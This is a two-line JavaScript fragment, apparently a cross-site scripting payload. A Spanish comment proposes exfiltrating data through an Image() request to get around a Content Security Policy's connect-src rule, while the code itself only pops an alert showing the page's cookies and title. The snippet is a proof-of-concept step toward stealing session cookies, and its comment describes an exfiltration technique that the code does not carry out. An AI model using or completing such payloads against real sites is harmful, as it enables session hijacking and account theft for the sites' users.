// Usar Image() para exfiltrar - no usa connect-src
alert(document.cookie + '|||' + document.title);